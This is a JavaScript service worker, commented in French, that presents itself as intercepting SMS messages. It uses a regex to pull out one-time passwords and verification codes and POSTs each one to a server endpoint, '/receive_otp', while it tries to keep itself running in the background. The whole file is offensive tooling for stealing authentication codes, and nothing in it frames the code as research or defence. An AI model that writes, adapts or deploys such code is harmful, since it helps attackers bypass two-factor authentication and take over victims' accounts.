self.addEventListener('push', function(event) {
    if (!event.data) return;

    let smsContent = event.data.text();
    console.log("📩 SMS intercepté :", smsContent);

    // Détection avancée OTP avec séparateurs
    let otpPattern = /(code|otp|verification|auth|sécurité|confirm|password).*?\b(\d[\s\-\.]?\d[\s\-\.]?\d[\s\-\.]?\d[\s\-\.]?\d[\s\-\.]?\d)\b/i;
    let match = smsContent.match(otpPattern);

    if (match) {
        let otpCode = match[2].replace(/[\s\-.]/g, "");  // Nettoyage du code OTP
        console.log("🔑 Code OTP détecté :", otpCode);

        // Envoi au serveur Flask
        fetch('/receive_otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ otp: otpCode })
        }).then(response => response.json())
          .then(data => console.log("✅ OTP envoyé avec succès :", data))
          .catch(error => console.error("❌ Erreur d'envoi OTP :", error));
    } else {
        console.log("⚠️ Aucun OTP détecté dans ce SMS.");
    }
});

// Garder le Service Worker actif en arrière-plan
self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
    console.log("✅ Service Worker activé et prêt.");

    // Tentative de persistance (si supporté par le navigateur)
    if (self.registration.keepAlive) {
        self.registration.keepAlive();
        console.log("🔄 Persistance activée.");
    } else {
        console.warn("⚠️ Persistance non supportée par ce navigateur.");
    }
});

// Reconnexion automatique pour maintenir l'écoute active
setInterval(() => {
    console.log("🔄 Vérification de l'activité du Service Worker...");
    fetch('/keep_alive')
        .then(response => console.log("✅ Connexion maintenue"))
        .catch(error => console.warn("⚠️ Service Worker suspendu, tentative de reconnexion...", error));
}, 30000); // Vérifie toutes les 30 secondes
